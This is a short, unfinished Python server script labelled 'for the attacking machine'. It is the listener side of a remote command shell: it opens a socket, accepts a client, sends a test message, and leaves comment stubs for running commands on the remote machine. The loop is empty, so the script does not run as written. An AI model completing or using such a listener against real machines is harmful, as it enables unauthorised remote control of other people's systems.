# server.py - For the attacking machine

import socket

import configuration as config  # Import configuration file

# CONSTANTS
ADDRESS = (config.SERVER_ADDR, config.SERVER_PORT)
BACKLOG = 5  # Max number of queued connections, system-dependent

########################
# CODE BEGINS
########################

# Create a socket to listen to incoming connections
server_socket = socket.socket()
# Bind it to the server address and port
server_socket.bind(ADDRESS)
server_socket.listen(BACKLOG)

print("Server now listening at address %s on port %s" % (ADDRESS[0], ADDRESS[1]))

# Accept a connection
connection_socket, client_addr = server_socket.accept()
print("Connected to %s on port %s" % (client_addr[0], client_addr[1]))

# FOR DEBUGGING ONLY - change text to bytes (via encode) and send it over the connection
message = "Test message!!!".encode()
connection_socket.send(message)  # Need to add some asymmetric encryption

# Server REPL loop - run the interactive shell
while True:
    # Read in command from input
    # Execute the command on the remote machine (client)
        # Note: break out of loop if the command was 'exit' or 'hangup'
    # Print the results
